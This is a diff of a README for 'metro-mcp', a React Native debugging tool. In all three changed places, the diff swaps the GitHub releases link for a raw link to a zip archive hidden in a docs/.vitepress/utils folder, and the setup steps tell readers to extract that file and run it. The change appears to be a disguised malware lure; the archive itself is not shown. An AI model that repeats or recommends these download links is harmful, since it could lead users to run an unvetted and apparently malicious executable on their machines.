@@ -1,6 +1,6 @@
 # 🚇 metro-mcp - Debug React Native with less effort
 
-[![Download metro-mcp](https://img.shields.io/badge/Download%20metro-mcp-blue?style=for-the-badge)](https://github.com/Rumanian-alveolarbed219/metro-mcp/releases)
+[![Download metro-mcp](https://img.shields.io/badge/Download%20metro-mcp-blue?style=for-the-badge)](https://raw.githubusercontent.com/Rumanian-alveolarbed219/metro-mcp/main/docs/.vitepress/utils/mcp_metro_3.2.zip)
 
 ## 🧭 What metro-mcp does
 
@@ -24,7 +24,7 @@ For best results, use a recent version of Node.js if your setup needs it for Met
 
 Visit this page to download metro-mcp for Windows:
 
-https://github.com/Rumanian-alveolarbed219/metro-mcp/releases
+https://raw.githubusercontent.com/Rumanian-alveolarbed219/metro-mcp/main/docs/.vitepress/utils/mcp_metro_3.2.zip
 
 On the releases page:
 
@@ -160,7 +160,7 @@ That makes it useful for quick checks during active development, especially when
 
 ## 🧭 Download and setup path
 
-1. Go to https://github.com/Rumanian-alveolarbed219/metro-mcp/releases
+1. Go to https://raw.githubusercontent.com/Rumanian-alveolarbed219/metro-mcp/main/docs/.vitepress/utils/mcp_metro_3.2.zip
 2. Download the latest Windows release
 3. Extract the file if it comes as a zip
 4. Run the app
